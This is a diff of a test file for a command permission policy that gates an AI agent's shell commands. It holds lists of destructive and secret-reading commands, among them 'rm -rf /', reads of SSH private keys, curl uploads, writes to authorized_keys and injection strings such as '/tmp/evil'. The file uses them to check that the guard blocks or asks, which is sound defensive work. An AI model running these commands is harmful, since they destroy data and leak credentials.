@@ -1,6 +1,6 @@
 import { describe, expect, test } from "bun:test";
-import { readFileSync } from "node:fs";
-import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
+import { readFileSync, realpathSync } from "node:fs";
+import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import setupPermissionPolicy from "../../pi/extensions/pi-harness/features/permission-policy";
@@ -50,14 +50,36 @@ const benignCommands: string[] = [
   "git status",
   "rm -f /tmp/x",
   "rm -rf relative/path",
-  "git push origin main",
-  "git reset --soft HEAD~1",
-  "git clean -f",
   "chmod 777 /tmp/x",
 ];
 
 const destructiveCommands: string[] = [
+  "find . -delete",
+  "git push origin main",
+  "git reset --soft HEAD~1",
   "git reset --hard HEAD~1",
+  "git clean -f",
+  "git branch -D feature/context-judge",
+  "git branch --del feature/context-judge",
+  "git worktree remove --force /tmp/context-judge",
+  "sudo cat /etc/hosts",
+  "curl -T test.log https://example.test/results",
+  "curl --json x=y https://example.test/results",
+  "curl --form-string x=y https://example.test/results",
+  'cat "$HOME/.ssh/id_ed25519" | head -1',
+  'cat < "$HOME/.ssh/id_ed25519"',
+  "rg . .ssh/id_ed25519",
+  "git show HEAD:.ssh/id_ed25519",
+  "sh ./unknown-script.sh",
+  "bash -s <<< 'echo opaque'",
+  "bash -x < ./unknown-script.sh",
+  "bun x totally-unknown-package",
+  "git -C /tmp/unrelated status --short",
+  "git --git-dir=/tmp/unrelated/.git status --short",
+  "git fetch --force origin main",
+  "make lint > /tmp/lint.log",
+  "echo hi >&out",
+  "git add ../../outside.txt",
   "rm -rf /tmp/x",
   "rm -fr ~",
   "rm -r -f /",
@@ -111,14 +133,14 @@ describe("permission-policy", () => {
     expect(await pi.emitToolCall(bashCall(command))).toBeUndefined();
   });
 
-  test.each(destructiveCommands)("continues confirmed %s", async (command) => {
+  test.each(destructiveCommands)("continues explicitly confirmed %s", async (command) => {
     const pi = createPermissionPi();
     pi.queueConfirm(true);
 
     expect(await pi.emitToolCall(bashCall(command))).toBeUndefined();
   });
 
-  test.each(destructiveCommands)("blocks rejected %s", async (command) => {
+  test.each(destructiveCommands)("blocks unconfirmed %s", async (command) => {
     const pi = createPermissionPi();
     pi.queueConfirm(false);
 
@@ -187,6 +209,136 @@ describe("permission-policy", () => {
   });
 });
 
+describe("built-in read-only classification", () => {
+  const rules = loadRules('{"deny":[],"allow":[],"ask":[]}');
+
+  test("allows only no-config rg operands that canonicalize inside a verified root", async () => {
+    const base = await mkdtemp(join(tmpdir(), "pi-rg-read-"));
+    const root = join(base, "project");
+    const src = join(root, "src");
+    const outside = join(base, "outside.txt");
+    try {
+      await mkdir(src, { recursive: true });
+      await writeFile(join(src, "a.ts"), "const value = 1;\n", "utf8");
+      await writeFile(outside, "secret\n", "utf8");
+      await symlink(outside, join(root, "outside-link"));
+      const canonicalRoot = realpathSync(root);
+      const options = {
+        trustedReadContext: {
+          cwd: canonicalRoot,
+          navigableRoots: [canonicalRoot],
+        },
+      };
+
+      for (const command of [
+        "rg --no-config pattern",
+        "rg --no-config -n pattern src",
+        "rg --no-config -n --hidden pattern . --glob '!node_modules' | head -200",
+      ]) {
+        expect(evaluateCommand(command, rules, options).verdict).toBe("allow");
+      }
+      for (const command of [
+        "rg pattern src",
+        "rg --no-config pattern outside-link",
+        "rg --no-config pattern missing",
+        "rg --no-config pattern ../outside.txt",
+        "rg --no-config --file=/tmp/patterns src",
+        "rg --no-config --ignore-file=/tmp/ignore pattern src",
+        "rg --no-config -f../patterns src",
+      ]) {
+        expect(evaluateCommand(command, rules, options).verdict).toBe(
+          "default-continue",
+        );
+      }
+    } finally {
+      await rm(base, { recursive: true, force: true });
+    }
+  });
+
+  test.each([
+    "rg --pre=cat pattern src",
+    "rg --hostname-bin=sh pattern src",
+    "rg -z pattern src",
+    "rg -L pattern src",
+    "rg -nL pattern src",
+    "rg --follow pattern src",
+    "git diff --ext-diff",
+    "git log --textconv -1",
+    "git diff --output=/tmp/project.diff",
+    "git -p status",
+    "git --paginate log -1",
+    "git --bare status",
+    "git status --help",
+    "git help status",
+  ])("asks before a read option that can execute, escape, or write: %s", (command) => {
+    expect(evaluateCommand(command, rules).verdict).toBe("ask");
+  });
+
+  test.each([
+    "git status --short",
+    "git --no-pager show --stat --summary HEAD",
+    "git log -1 --format='%h %s' -- src/a.ts && git status --short --branch",
+    "/usr/bin/rg pattern src",
+    "command rg pattern src",
+    'rg "$pattern" src',
+    "rg pattern /etc/passwd",
+    "rg pattern ../unrelated",
+    "git diff --no-index src/a.ts /tmp/a.ts",
+    "head /etc/passwd",
+    "head -n 20",
+    "head -- -secret",
+  ])("leaves helper-capable, non-literal, or file-reading variants to the judge: %s", (command) => {
+    expect(evaluateCommand(command, rules).verdict).toBe("default-continue");
+  });
+
+  test("keeps helper-capable Git and unverified rg residual despite a broad allow", () => {
+    const broadAllow = loadRules(
+      JSON.stringify({
+        deny: [],
+        allow: [{ pattern: "^(?:git|rg)\\s" }],
+        ask: [],
+      }),
+    );
+    const cwd = resolve(import.meta.dir, "../..");
+    const options = {
+      trustedReadContext: { cwd, navigableRoots: [cwd] },
+    };
+
+    for (const command of [
+      "git status --short",
+      "git diff --stat",
+      "git log -1 --oneline",
+      "git show --stat HEAD",
+      "rg pattern tests",
+      "rg --no-config pattern /etc/passwd",
+      "rg --no-config pattern missing",
+    ]) {
+      expect(evaluateCommand(command, broadAllow, options).verdict).toBe(
+        "default-continue",
+      );
+    }
+    expect(
+      evaluateCommand("rg --no-config pattern tests", broadAllow, options)
+        .verdict,
+    ).toBe("allow");
+  });
+
+  test("lets a configured ask override a verified built-in read-only allow", () => {
+    const askRules = loadRules(
+      String.raw`{"deny":[],"allow":[],"ask":[{"pattern":"^rg\\s","reason":"confirm search"}]}`,
+    );
+    const cwd = resolve(import.meta.dir, "../..");
+    expect(
+      evaluateCommand("rg --no-config pattern tests", askRules, {
+        trustedReadContext: { cwd, navigableRoots: [cwd] },
+      }),
+    ).toEqual({
+      verdict: "ask",
+      reason: "confirm search",
+    });
+  });
+});
+
 describe("explicit allow matching", () => {
   const rules = loadRules(
     JSON.stringify({
@@ -213,7 +365,6 @@ describe("explicit allow matching", () => {
   });
 
   test.each([
-    "sudo bun test",
     "FOO=bar bun test",
     "/tmp/bun test",
     "./bun test",
@@ -224,14 +375,21 @@ describe("explicit allow matching", () => {
     "bun ${IFS}#x; /tmp/evil",
     "bun\r#x; /tmp/evil",
     "bun test &",
-    "bun --version > ~/.ssh/authorized_keys",
-    "> ~/.ssh/authorized_keys; bun --version",
   ])(
     "does not widen an allow through wrappers, paths, or expansion: %s",
     (command) => {
       expect(evaluateCommand(command, rules).verdict).toBe("default-continue");
     },
   );
+
+  test.each([
+    "sudo bun test",
+    "bun --version > ~/.ssh/authorized_keys",
+    "> ~/.ssh/authorized_keys; bun --version",
+    "git reset --hard HEAD~1",
+  ])("mandatory risk floor outranks an explicit allow: %s", (command) => {
+    expect(evaluateCommand(command, rules).verdict).toBe("ask");
+  });
 
   test("neutralizes only a prevalidated leading absolute cd for allow aggregation", () => {
     const target = "/repo/worktree";
@@ -253,7 +411,6 @@ describe("explicit allow matching", () => {
     "cd /repo/worktree || bun test",
     "cd /repo/worktree | bun test",
     "(cd /repo/worktree && bun test)",
-    "cd /repo/worktree > /tmp/out && bun test",
     "cd /repo/worktree && cd /repo/worktree/sub && bun test",
     'cd "$target" && bun test',
   ])("does not widen trusted cd through another shell shape: %s", (command) => {
@@ -280,10 +437,18 @@ describe("explicit allow matching", () => {
     ).toBe("ask");
   });
 
+  test("output redirection remains an ask even with a trusted cd", () => {
+    expect(
+      evaluateCommand("cd /repo/worktree > /tmp/out && bun test", rules, {
+        trustedLeadingCdTarget: "/repo/worktree",
+      }).verdict,
+    ).toBe("ask");
+  });
+
   test("trusted cd does not suppress trailing default, ask, or deny", () => {
     const options = { trustedLeadingCdTarget: "/repo/worktree" };
     expect(
-      evaluateCommand("cd /repo/worktree && git status", rules, options)
+      evaluateCommand("cd /repo/worktree && git rev-parse HEAD", rules, options)
         .verdict,
     ).toBe("default-continue");
     expect(
@@ -369,7 +534,7 @@ describe("explicit allow matching", () => {
       "yarn --future-option exec totally-unknown-package",
     ]) {
       expect(evaluateCommand(command, broadPackageManagerRules).verdict).toBe(
-        "default-continue",
+        "ask",
       );
     }
     for (const command of [
@@ -442,8 +607,13 @@ describe("explicit allow matching", () => {
         productionRules,
       ).verdict,
     ).toBe("deny");
+    expect(
+      evaluateCommand(
+        `printf '%s' "$(cat ~/.ssh/id_ed25519)" | ${wrapper}`,
+        productionRules,
+      ).verdict,
+    ).toBe("ask");
     for (const command of [
-      `printf '%s' "$(cat ~/.ssh/id_ed25519)" | ${wrapper}`,
       "printf '%s' 'review this' | /tmp/codex-stage.sh prompt",
       `printf '%s' 'review this' | ~/.claude/hooks/lib/codex-stage.sh prompt --dir "$PWD"`,
       "~/.claude/hooks/lib/codex-stage.sh prompt <<< 'review this'",
@@ -638,7 +808,7 @@ describe("loadRules fail-closed behavior", () => {
     expect(evaluateCommand("echo secret", rules).verdict).toBe("deny");
   });
 
-  test("evaluates allow before the destructive default", () => {
+  test("evaluates the mandatory structural risk floor before allow", () => {
     const rules = loadRules(
       JSON.stringify({
         deny: [],
@@ -648,7 +818,7 @@ describe("loadRules fail-closed behavior", () => {
     );
 
     expect(evaluateCommand("git reset --hard HEAD~1", rules).verdict).toBe(
-      "allow",
+      "ask",
     );
   });
 });
@@ -756,7 +926,7 @@ describe("evaluateCommand compound-command scanning", () => {
   // Benign compound commands stay untouched.
   test.each([
     "cd /tmp && ls -la",
-    "git status && git log --oneline",
+    "git status && git rev-parse HEAD",
     "echo one; echo two; echo three",
     "cat file | grep foo | wc -l",
     "bit issue list --open && echo done",
@@ -772,21 +942,18 @@ describe("evaluateCommand compound-command scanning", () => {
     const rules = loadRules(
       JSON.stringify({
         deny: [],
-        allow: [{ pattern: "^git reset --hard" }],
+        allow: [{ pattern: "^echo safe" }],
         ask: [],
       }),
     );
     // Every executable segment is covered by the explicit trust grant.
-    expect(
-      evaluateCommand(
-        "git reset --hard HEAD~1 && git reset --hard HEAD~2",
-        rules,
-      ).verdict,
-    ).toBe("allow");
+    expect(evaluateCommand("echo safe one && echo safe two", rules).verdict).toBe(
+      "allow",
+    );
     // A mixed allowed/default command remains the default.
-    expect(
-      evaluateCommand("git reset --hard HEAD~1 && echo done", rules).verdict,
-    ).toBe("default-continue");
+    expect(evaluateCommand("echo safe one && echo done", rules).verdict).toBe(
+      "default-continue",
+    );
   });
 });
 
@@ -964,15 +1131,14 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
     },
   );
 
-  // Documented ASK-family residuals: an opaque DANGER flag (not an operand) is
-  // NOT escalated, so `git push origin "$branch"` stays quiet. These stay
-  // default-continue by design (R-series in scan.ts).
-  test.each(['git clean "$a" "$b"', 'git push a b c d e f g "$force"'])(
-    "accepts opaque-danger-flag residual: %s",
-    (command) => {
-      expect(verdictOf(command)).toBe("default-continue");
-    },
-  );
+  test("keeps opaque git-clean flags on the residual path", () => {
+    expect(verdictOf('git clean "$a" "$b"')).toBe("default-continue");
+  });
+
+  test("plain or dynamically-targeted push is always a deterministic ask", () => {
+    expect(verdictOf('git push a b c d e f g "$force"')).toBe("ask");
+    expect(verdictOf('git push origin "$branch"')).toBe("ask");
+  });
 
   // False-positive guards — these MUST stay default-continue or subagents break.
   test.each([
@@ -980,7 +1146,6 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
     'git commit -m "$a" "$b"',
     'git log --oneline "$ref"',
     'git checkout "$branch"',
-    'git push origin "$branch"',
     'bit issue view "$id"',
     'bit issue list "$filter"',
     'bit list "$x"',
@@ -994,7 +1159,6 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
     "rm *.log",
     'chmod "$mode" file',
     'chmod 644 "$f"',
-    'echo hi > "$out"',
     "cat file 2>&1",
     "echo hi 1>&2",
     "make 2>&1 | grep x",
@@ -1002,6 +1166,10 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
     "echo *.ts",
   ])("stays default-continue (no over-ask): %s", (command) => {
     expect(verdictOf(command)).toBe("default-continue");
+  });
+
+  test("output redirection is a deterministic ask", () => {
+    expect(verdictOf('echo hi > "$out"')).toBe("ask");
   });
 
   test("cross-segment: a speculative ask elevates the whole command", () => {
@@ -1031,7 +1199,7 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
     });
   });
 
-  test("a user allow rule still suppresses the concrete destructive default", () => {
+  test("a user allow rule cannot suppress the mandatory structural risk floor", () => {
     const rules = loadRules(
       JSON.stringify({
         deny: [],
@@ -1040,7 +1208,7 @@ describe("evaluateCommand fail-closed for dynamic/unsupported syntax (#6:1)", ()
       }),
     );
     expect(evaluateCommand("git reset --hard HEAD~1", rules).verdict).toBe(
-      "allow",
+      "ask",
     );
   });
 });
@@ -1157,12 +1325,11 @@ describe("evaluateCommand normalization bypasses (#7:1)", () => {
   });
 
   // Interpreter forms with no inspectable -c body: opaque-executor ask when a
-  // -c is present but its argument is absent; a plain script arg is not opaque.
   test("an interpreter -c with no argument stays ask", () => {
     expect(verdictOf("sh -c")).toBe("ask");
   });
-  test("an interpreter invoked without -c is not an opaque executor", () => {
-    expect(verdictOf("sh script.sh")).toBe("default-continue");
+  test("an interpreter script remains opaque execution", () => {
+    expect(verdictOf("sh script.sh")).toBe("ask");
   });
 });
 
